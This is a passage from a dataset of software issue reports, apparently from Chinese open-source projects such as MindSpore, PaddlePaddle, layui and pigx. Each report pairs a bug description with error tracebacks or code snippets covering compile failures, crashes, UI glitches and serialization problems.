2}], ""full_name"": ""Default/AddN-op4232"", ""gen_model"": ""single"", ""graph_id"": 381, ""inputs"": [[{""addr_type"": 0, ""dtype"": ""float32"", ""format"": ""FRACTAL_NZ"", ""name"": ""x_dynamic_0"", ""ori_format"": ""NCHW"", ""ori_shape"": [84, 256], ""param_type"": ""dynamic"", ""range"": [[16, 16], [6, 6], [16, 16], [16, 16]], ""shape"": [16, 6, 16, 16], ""valid"": true}, {""addr_type"": 0, ""dtype"": ""float32"", ""format"": ""FRACTAL_NZ"", ""name"": ""x_dynamic_1"", ""ori_format"": ""NCHW"", ""ori_shape"": [1, 84, 256], ""param_type"": ""dynamic"", ""range"": [[1, 1], [16, 16], [6, 6], [16, 16], [16, 16]], ""shape"": [1, 16, 6, 16, 16], ""valid"": true}]], ""is_dynamic_shape"": false, ""kernel_name"": ""AddN_17658003484443355035_0"", ""module_name"": ""impl.add_n"", ""name"": ""add_n"", ""op_tune_list"": ""ALL"", ""op_tune_switch"": ""on"", ""outputs"": [[{""addr_type"": 0, ""dtype"": ""float32"", ""format"": ""FRACTAL_NZ"", ""name"": ""y"", ""ori_format"": ""NCHW"", ""ori_shape"": [84, 256], ""param_type"": ""required"", ""range"": [[16, 16], [6, 6], [16, 16], [16, 16]], ""shape"": [16, 6, 16, 16], ""valid"": true}]], ""pass_list"": ""ALL"", ""py_module_path"": ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe"", ""rl_tune_list"": ""ALL"", ""rl_tune_switch"": ""on"", ""socVersion"": ""Ascend910A""}, ""platform"": ""TBE"", ""reset_op_info"": [{""type"": ""clear_vector"", ""bin_path"": ""./kernel_meta/vector_random_buff.o"", ""kernel_name"": ""vector_random_buff""}, {""type"": ""clear_cube"", ""bin_path"": ""./kernel_meta/cube_random_buff.o"", ""kernel_name"": ""cube_random_buff""}]} trace: # [ERROR] DEVICE(108049,ffff06cd71f0,python3):2021-10-11-01:59:14.124.585 [mindspore/ccsrc/runtime/device/ascend/ascend_memory_manager.cc:108] FreeDeviceMemory] rtFree mem size[32212254720] fail, ret[507899] v1.5.0"
之前在910上能跑的通的代码突然跑不通了,"模型之前在910上能跑的通，但是今天跑的时候突然报错了。报错信息如下所示。后来，我将该项目迁移到自己的gpu上，是能够跑的通的。   <code>: [WARNING] DEVICE(151685,ffff43a391e0,python):2021-11-13-21:54:41.398.597 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[OneHot]reduce precision from int64 to int32 [WARNING] DEVICE(151685,ffff43a391e0,python):2021-11-13-21:54:41.398.668 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[OneHot]reduce precision from int64 to int32 [WARNING] SESSION(151685,ffff43a391e0,python):2021-11-13-21:54:42.089.881 [mindspore/ccsrc/backend/session/ascend_session.cc:1381] SelectKernel] There are 37 node/nodes used reduce precision to selected the kernel! Traceback (most recent call last): File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_ascend.py"", line 144, in &lt;module&gt; messager.run() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 107, in run self.loop() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server.py"", line 104, in loop self.handle() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_ascend.py"", line 108, in handle self.tbe_handle(arg) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_ascend.py"", line 76, in tbe_handle res = self.tbe_builder.start(json) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/remote/kernel_build_server_ascend.py"", line 36, in start return self.tbe_builder.start_compile_op(json) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/tbe_process.py"", line 343, in start_compile_op self.__reset_op_info = self.get_reset_op_info() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/tbe_process.py"", line 314, in get_reset_op_info vector_random_buff.vector_random_buff() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/platform/vector_random_buff.py"", line 82, in vector_random_buff return tik_instance_fun() File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/platform/vector_random_buff.py"", line 51, in tik_instance_fun config={""build_sub_function"": True, ""dump_to_header_file"": True}) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_source_info.py"", line 43, in wrapper f_return = func(*args, **kwargs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/api/tik_build.py"", line 493, in BuildCCE config, flowtable_tmp, evaluates, extend_params) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/debug/decorators.py"", line 170, in wrapper flowtable_tmp, scalar_value_map, extend_params) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 143, in build_cce build_schedules(config, schedule, arg, kernel_name, None) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 368, in build_schedules return tvm.build(schedules, args, ""cce"", name=kernel_name, rules=rules) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/build_module.py"", line 963, in build fhost, mdev = _build_for_device(flist, tar, target_host) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/build_module.py"", line 758, in _build_for_device mdev = codegen.build_module(fdevice, str(target)) if fdevice else None File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/codegen.py"", line 36, in build_module return _Build(lowered_func, target) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 209, in __call__ raise get_last_ffi_error() tvm._ffi.base.TVMError: Traceback (most recent call last): [bt] (6) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(TVMFuncCall+0x70) [0xffff5f3dde28] [bt] (5) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(+0x1093f08) [0xffff5e7adf08] [bt] (4) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(tvm::codegen::Build(tvm::Array&lt;tvm::LoweredFunc, void&gt; const&amp;, std::string const&amp;)+0x474) [0xffff5e945bc4] [bt] (3) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(+0x1540fa0) [0xffff5ec5afa0] [bt] (2) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(+0x1540300) [0xffff5ec5a300] [bt] (1) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(+0x153ee50) [0xffff5ec58e50] [bt] (0) /usr/local/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/lib64/libtvm.so(+0x1cc2d5c) [0xffff5f3dcd5c] File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 219, in tvm_callback_cce_compile output_dir, bin_file_prefix + kernel_name + bin_file_suffix)) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/cce_build_module.py"", line 42, in wrapper r = fn(*args, **kw) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 701, in compile_cce _dump_cce(kernel_name, temp_code) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 631, in _dump_cce _save_cce_file(kernel_name, temp_code) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 629, in _save_cce_file _run_cmd(copy_cmd, ""copy"") File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/contrib/ccec.py"", line 535, in _run_cmd raise CompileError(msg) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 74, in cfun rv = local_pyfunc(*pyargs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/te/tvm/runtime/cce_runtime.py"", line 222, in tvm_callback_cce_compile raise RuntimeError(""compile cce error : "", errs) Compile Error: Unknown errors [ERROR] SESSION(151685,ffff43a391e0,python):2021-11-13-21:54:45.960.098 [mindspore/ccsrc/backend/session/kernel_build_client.h:110] Response] Response is empty Traceback (most recent call last): File ""train_ucf_changelrform.py"", line 332, in &lt;module&gt; run_train() File ""train_ucf_changelrform.py"", line 155, in run_train dataset_sink_mode=False) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 433, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 546, in _train_process list_callback.epoch_begin(run_context) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/callback/_callback.py"", line 202, in epoch_begin cb.epoch_begin(run_context) File ""train_ucf_changelrform.py"", line 315, in epoch_begin acc = self.models.eval(self.eval_dataset) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 779, in eval return self._eval_dataset_sink_process(valid_dataset, list_callback, cb_params) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 676, in _eval_dataset_sink_process outputs = self._eval_network(*inputs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 386, in __call__ out = self.compile_and_run(*inputs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 644, in compile_and_run self.compile(*inputs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 631, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 531, in compile result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name) RuntimeError: mindspore/ccsrc/backend/session/kernel_build_client.h:110 Response] Response is empty # In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/dataset_helper.py(78) outputs = self.get_next() ^ [WARNING] MD(151685,ffffba640630,python):2021-11-13-21:54:49.029.905 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:73] ~DeviceQueueOp] preprocess_batch: 4; batch_queue: 0, 0, 0, 0, 0, 0, 0, 0, 0; push_start_time: 2021-11-13-21:54:46.675.489, 2021-11-13-21:54:47.391.991, 2021-11-13-21:54:48.116.588, 2021-11-13-21:54:48.830.973; push_end_time: 2021-11-13-21:54:46.711.467, 2021-11-13-21:54:47.397.260, 2021-11-13-21:54:48.122.006, 2021-11-13-21:54:48.836.165."
avue-input-tree 多选时标签值过多挤高样式,"选择过多时，标签的的高度随之变化   <code>: &lt;avue-input-tree class=""dialog-search-select company-select"" multiple v-model=""searchParams.company"" placeholder=""请选择内容"" type=""tree"" :dic=""companyDic""&gt;&lt;/avue-input-tree&gt;"
字符串截取时考虑的情况不全面导致的BUG,"在这个方法中 cn.afterturn.easypoi.csv.imports.CsvImportService#saveFieldValue 如果导入的有textMark, 会把整个cell的内容都替换成 空串。 复现方式: 导入的文件，cell有双引号作为TextMark   <code>: if (cell.startsWith(params.getTextMark()) &amp;&amp; cell.endsWith(params.getTextMark())) { cell = cell.replaceFirst(cell, params.getTextMark()); cell = cell.substring(0, cell.lastIndexOf(params.getTextMark())); }"
版本升级到2.0.6以上报错,"APPLICATION FAILED TO START Description: An attempt was made to call the method springfox.documentation.spi.service.contexts.RequestMappingContext.findAnnotation(Ljava/lang/Class;)Ljava/util/Optional; but it does not exist. Its class, springfox.documentation.spi.service.contexts.RequestMappingContext, is available from the following locations: It was loaded from the following location:   <code>: jar:file:/Users/xxx/.m2/repository/io/springfox/springfox-spi/2.9.2/springfox-spi-2.9.2.jar!/springfox/documentation/spi/service/contexts/RequestMappingContext.class file:/Users/xxx/.m2/repository/io/springfox/springfox-spi/2.9.2/springfox-spi-2.9.2.jar"
复选框无法正常显示,"版本：2.7.6 描述：本地版无法正常显示，在线版可以 代码及效果 本地版：   <code>: &lt;link href=""/static/layui/css/layui.css"" rel=""stylesheet""&gt; &lt;script src=""/static/layui/layui.js""&gt;&lt;/script&gt; &lt;link href=""//unpkg.com/layui@2.7.6/dist/css/layui.css"" rel=""stylesheet""&gt; &lt;script src=""//unpkg.com/layui@2.7.6/dist/layui.js""&gt;&lt;/script&gt;"
树形控件默认不涨开设置无效,上面的语法 如果option中 defaultExpandAll设置成false 这个也是返回true 可以改成   <code>: return this.option.defaultExpandAll || true return this.$util.getObjType(this.option.defaultExpandAll) === 'boolean' ? this.option.defaultExpandAll : true
"【gateway】登陆请求，gateway中的Filter获取的请求参数为空,POST和GET效果一样","pigx版本: 3.2 操作系统: windows10 是否修改包名: 商业版（已修改包名） 登陆请求，gateway中的Filter获取的参数为空,POST和GET效果一样 1、用POST或GET调用登陆接口 2、Debug模式在cn.ac.turingcloud.gateway.filter.ValidateCodeGatewayFilter的70行打断点，发现grantType为null   <code>: // 刷新token，直接向下执行 String grantType = request.getQueryParams().getFirst(""grant_type""); if (StrUtil.equals(SecurityConstants.REFRESH_TOKEN, grantType)) { return chain.filter(exchange); }"
layui  lay-nav导航事件，点击侧边栏导航，左侧高亮整个页面刷新右侧根据点击不同显示不同内容是怎么做到的,"版本：layui2.7 描述：如下面的截图，点击侧边栏 整个页面刷新 在所点击的a元素的父级节点dd添加class=""layui-this""是怎么做到的呀？这样能保证点击左侧高亮 右边显示不同的内容。   <code>: layui.use(['element', 'util'], function(){ var element = layui.element ,util = layui.util ,$ = layui.jquery; //导航点击事件 element.on('nav(test)', function(elem){ //layer.msg(elem.text()); var sideId=$(this).attr(""id""); $(this).attr(""name"",""123""); $('#'+sideId).parent().addClass(""layui-this""); elem.parent().addClass(""layui-this""); //console.log($('#'+sideId).parent()); console.log(elem.addClass(""layui-this"")); alert(elem.text()); }); });"
Long型主键精度丢失问题,"版本号： v3.2.0 Long型主键数据转json后，精度丢失。 最新WebMvcConfiguration已经没有以下配置，为什么要删除这段代码，是有问题吗   <code>: SimpleModule simpleModule = new SimpleModule(); simpleModule.addSerializer(Long.class, ToStringSerializer.instance); simpleModule.addSerializer(Long.TYPE, ToStringSerializer.instance);"
4.2版本websocket问题,"环境信息 pigx版本: 4.2 提供详细 这个sessionKey的生成策略可能存在问题： 同一帐号在不同地方登录时，首次登录会话被强制退出，会触发removeSession(sessionKey)，由于前后两次登录的sessionKey 一样，所以USER_SESSION_MAP就空了，连接（心跳）还在，但信息 发不出去了。是不是可以考虑改成： return String.format(""%s:%s:%s:%s"", webSocketSession.getId(), instance.getHost(), instance.getPort(), user.getId());   <code>: /** * 获取当前session的唯一标识 * @param webSocketSession 当前session * @return session唯一标识 */ @Override public Object sessionKey(WebSocketSession webSocketSession) { Object obj = webSocketSession.getAttributes().get(""USER_KEY_ATTR_NAME""); if (obj instanceof PigxUser) { PigxUser user = (PigxUser) obj; // IP:port:userId 作为唯一区分 return String.format(""%s:%s:%s"", instance.getHost(), instance.getPort(), user.getId()); } return null; }"
[ST][MS][函数式编程]resnet50 cifar10 gpu 八卡当设置jit_config时，训练失败,"函数式编程时 resnet50 cifar10 gpu 八卡当设置jit_config时，训练失败 / 硬件环境: /device /GPU/ : -- MindSpore version :commit_id = '[sha1]:2a6a7dea,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_cell_functional_programming_datasink_010 source ~/solution_test/env_set.source -e cuda11 source /home/miniconda3/bin/activate ci export DEVICE_TYPE=GPU_PCIE cd solution_test/cases/01frame_func/17cell_function_coding/support_data_sinking/resnet pytest -s test_ms_cell_functional_programming_datasink_010.py 训练正常 责任人 樊大为   <code>: [WARNING] MD(69575,7f8b106f3740,python):2022-12-17-16:32:47.141.660 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 0; batch_queue: 0; push_start_time: ; push_end_time: . Traceback (most recent call last): File ""train_functional.py"", line 401, in &lt;module&gt; train_net() File ""train_functional.py"", line 337, in train_net loss = sink_process() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/data_sink.py"", line 208, in sink_process out = real_sink_fun() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 575, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 98, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 305, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 301, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 373, in compile self._graph_executor.set_jit_config(self.jit_config_dict) RuntimeError: Unable to cast Python instance of type &lt;class 'bool'&gt; to C++ type 'std::string'"
自动生成组件可自定义,"自动生成组件可自定义 可通过 指定此字段用 组件来呈现   <code>: [Display(Name = ""是/否"")] [AutoGenerateColumn(Order = 50, ComponentType = typeof(Switch))] public bool Complete { get; set; } ComponentType = typeof(Switch) Switch"
"执行查询 com.jeesite.common.entity.BaseEntity#corpCode 属性 =""0""","执行查询 com.jeesite.common.entity.BaseEntity#corpCode 属性 =""0""   <code>: 查询条件对象: public class OrderHeader extends DataEntity&lt;OrderHeader&gt; { 查询方法: @MyBatisDao public interface OrderHeaderDao extends CrudDao&lt;OrderHeader&gt; { List&lt;OrderHeader&gt; findOrderHeaderInfoPage(@Param(""orderHeader"") OrderHeader orderHeader); 在idea 内执行debug 的时候查询 的时候 执行这个的时候 orderHeader内的corpCode 不知道在什么位置会给赋值上当前登录用户 执行正常 当打包后: mvn clean package spring-boot:repackage -Dmaven.test.skip=true -U 打包后 java -Xms256m -Xmx1024m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=512m -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar js.war 执行war 的时候, 查询com.jeesite.common.entity.BaseEntity#corpCode 属性 =""0"" 导致最终sql 执行结果没有值, 问题就出在这个corpCode 什么时候赋值的, 为什么打包后的 war 就不会自动赋值了 ### 环境版本： - JDK版本：1.8 - 浏览器版本：Chrome - 平台版本：JeeSite 4.1.2-SNAPSHOT"
[CT][MS][diagpart]test_diag_input_12_list except typeerror but got valueerror,"test_diag_input_12_list except typeerror but got valueerror / 硬件环境: Ascend /device ascend : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): graph/pynative /mode pynative /mode graph test_diag_input_12_list pytest -s -v operations/test_diag.py::test_diag_input_12_list case pass   <code>: def test_diag_input_12_list(): input_list = [12, ] net = Diag() fact = AnyNetFactory(net=net) with pytest.raises(TypeError): &gt; fact(input_list) ../operations/test_diag.py:264: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:818: in __call__ return self.net(*args) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:591: in __call__ out = self.compile_and_run(*args) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:979: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:951: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff6adf5910&gt; obj = WrapOp&lt;&gt;, phase = 'train.1607120400987207936.281471553023344.13' do_convert = True, auto_parallel_mode = False, jit_config_dict = {} def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E ValueError: For primitive[Diag], the input rank must be greater than or equal to 1, but got 0. E"
Row组件内容数量变化时，新增的内容位于Row组件之外,"使用row组件时，如果StudentsShow数量增加，新增加的card组件位于row组件之后，表现为一个组件占一行。 无 组件版本 latest 浏览器 all Server Side   <code>: &lt;Row ItemsPerRow=""ItemsPerRow.Four""&gt; @foreach (var item in StudentsShow) { &lt;Card &gt; &lt;CardBody&gt; &lt;h5 class=""card-title""&gt;Card @item &lt;/h5&gt; &lt;p class=""card-text""&gt;Some quick example text to build on the card title and make up the bulk of the card's content.&lt;/p&gt; &lt;a href=""#"" class=""btn btn-primary""&gt;@item &lt;/a&gt; &lt;/CardBody&gt; &lt;/Card&gt; } &lt;/Row&gt; &lt;div class=""row"" &gt; @foreach (var item in StudentsShow) { &lt;Card class=""col-3"" &gt; &lt;CardBody&gt; &lt;h5 class=""card-title""&gt;Card @item &lt;/h5&gt; &lt;p class=""card-text""&gt;Some quick example text to build on the card title and make up the bulk of the card's content.&lt;/p&gt; &lt;a href=""#"" class=""btn btn-primary""&gt;@item &lt;/a&gt; &lt;/CardBody&gt; &lt;/Card&gt; } &lt;/div&gt;"
"[CT][MS][generate]net with Minimum, dynamic shape core dump","网络包含Minimum，动态shape输入，CPU后端core dump / 硬件环境: /device CPU : -- MindSpore version :27a9d458, master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph python test_net12.py pass core dump Program received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fffa248f700(LWP 76982)] 0x00007fff38a61a84 in mindspore::kernel::MinimumCpuKernelMode::BroadcastArithTensor (this=0x55555a648 at /home/zjun/mindspre/mindspore/ccsrc/plugin/device/cpu/kernel/minimum_cpu_kernel.cc:2217 217 output[i] = MinimumFunc(input_x[i], input_y[i]); Missing seprate debuginfos, use: debuginfo-install libuuid-2.23.2-33.2.h6.x86_64 (gdb) (gdb)   <code>: from mindspore.common import Parameter from mindspore.common import Tensor from mindspore.common import dtype import mindspore.nn as nn import mindspore.ops.operations as P from mindspore import context import mindspore.numpy as np from mindspore.numpy import ones, array context.set_context(mode=context.PYNATIVE_MODE, device_target='CPU') input0 = ones([6, 9], dtype.float32) class Net(nn.Cell): def __init__(self): super().__init__() self.param0 = Parameter(ones([10, 4, 6], dtype.float32), name='param0') self.param1 = Parameter(ones([6, 6, 3, 3], dtype.float32), name='param1') self.logicalor00 = P.LogicalOr() self.relu01 = P.ReLU() self.tanh10 = P.Tanh() self.square11 = P.Square() self.gelu12 = P.GeLU() self.concat13 = P.Concat(2) self.reducemean20 = P.ReduceMean(keep_dims=True) self.elu21 = P.Elu() self.mul22 = P.Mul() self.minimum30 = P.Minimum() def construct(self, input0): logicalor00_output0 = self.logicalor00(P.Cast()(self.param0, dtype.bool_), P.Cast()(self.param0, dtype.bool_)) logicalor00_output0 = P.Cast()(logicalor00_output0, dtype.float32) relu01_output0 = self.relu01(input0) tanh10_output0 = self.tanh10(self.param0) square11_output0 = self.square11(tanh10_output0) gelu12_output0 = self.gelu12(logicalor00_output0) concat13_output0 = self.concat13([logicalor00_output0, logicalor00_output0]) reducemean20_output0 = self.reducemean20(self.param0, (-1, 0, -2)) elu21_output0 = self.elu21(logicalor00_output0) mul22_output0 = self.mul22(elu21_output0, tanh10_output0) minimum30_output0 = self.minimum30(relu01_output0, relu01_output0) return minimum30_output0 x = Tensor(shape=[6, None], dtype=dtype.float32) net = Net() net.set_inputs(x) net(input0)"
[CT][MS][SegmentMax] The testcase of SegmentMax、SegmentMin cause error with input 3D,"The testcase of SegmentMax、SegmentMin cause error with input 3D The testcase of SegmentMax、SegmentMin cause error with input 3D / 硬件环境: /device ascend : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph pytest test_segmentmax.py::test_segmentmax_input_dtype_uint32_3d --count 30 pytest test_segmentmin.py::test_segmentmin_input_dtype_uint32_3d --count 30 run pass and no error   <code>: def test_segmentmax_input_dtype_uint32_3d(): input_list = [] x0 = Tensor(np.random.randint(100, size=(30, 30, 25)).astype(np.uint32)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0] * 10, size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentMaxMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp()"
Fix pre-commit-config.yaml,"In my environment(windows + git bash), will report the following error when I git commit.   <code>: Executable `./.clang_format.hook` not found"
ActiveRecord 模式不需要当前对象的方法是否可以改为静态,com.baomidou.mybatisplus.activerecord.Model 里面的、等方法，是否可以改为静态，便于不创建对象就可以调用   <code>: deleteById(Serializable id) selectAll()
help 关于新建OP操作问题 ,"环境 python 3.7 PaddlePaddle = 1.7.2 问题 我新建了一个OP，我希望输入sequence对象   <code>: def create_tmp_var(program, name, dtype, shape): # t = fluid.create_lod_tensor(np.ndarray([5, 30]), [[2, 3]], fluid.CPUPlace()) return program.current_block().create_var(name=name, dtype=dtype, shape=shape) o1 = create_tmp_var(fluid.default_main_program(), name='o1', dtype='float32', shape=[unpad_feature.shape[0], unpad_feature.shape[1]*2])"
Distributed training not working with GPU,"CPU place is fine, but using CUDAPlace I get crash log as below:   <code>: ? ~ export TRAINING_ROLE=TRAINER SERVER_ENDPOINT=127.0.0.1:6175 PSERVERS=127.0.0.1:6175 LD_LIBRARY_PATH=/usr/local/cuda-8.0/lib64:/usr/local/lib/ CUDA_VISIBLE_DEVICES=0 GLOG_v=3;python notest_recognize_digits_conv_dist.py WARNING: Logging before InitGoogleLogging() is written to STDERR I0110 16:14:36.014297 56776 init.cc:39] Init commandline: notest_recognize_digits_conv_dist.py --tryfromenv=use_pinned_memory,check_nan_inf,fraction_of_gpu_memory_to_use *** Aborted at 1515629677 (unix time) try ""date -d @1515629677"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 56776 (TID 0x7f511de68700) from PID 0; stack trace: *** @ 0x7f511da61390 (unknown) @ 0x7f50af89edc7 (unknown) @ 0x7f50af7ae224 (unknown) @ 0x7f50af8fa5c2 cuMemcpyDtoHAsync_v2 @ 0x7f50880353af cudart::driverHelper::memcpyAsyncDispatch() @ 0x7f508801464b cudart::cudaApiMemcpyAsyncCommon() @ 0x7f508804b5c8 cudaMemcpyAsync @ 0x7f5088005555 paddle::platform::GpuMemcpyAsync() @ 0x7f5087e39e62 paddle::framework::SerializeToStream() @ 0x7f5087e37a5e paddle::framework::SerializeToStream() @ 0x7f5087e2f45b paddle::operators::detail::RPCClient::SendVariable() @ 0x7f5087d9b4dc paddle::operators::SendOp::Run() @ 0x7f508765cee7 paddle::framework::Executor::Run() @ 0x7f50875c3a63 _ZZN8pybind1112cpp_function10initializeIZNS0_C4IvN6paddle9framework8ExecutorEIRKNS4_11ProgramDescEPNS4_5ScopeEibbEINS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vISO_S8_SA_ibbEISB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENUlRNS_6detail13function_callEE1_4_FUNESV_ @ 0x7f50875c16b4 pybind11::cpp_function::dispatcher() @ 0x4cad00 PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4ca088 PyEval_EvalFrameEx @ 0x4c2705 PyEval_EvalCodeEx @ 0x4c24a9 PyEval_EvalCode @ 0x4f19ef (unknown) @ 0x4ec372 PyRun_FileExFlags @ 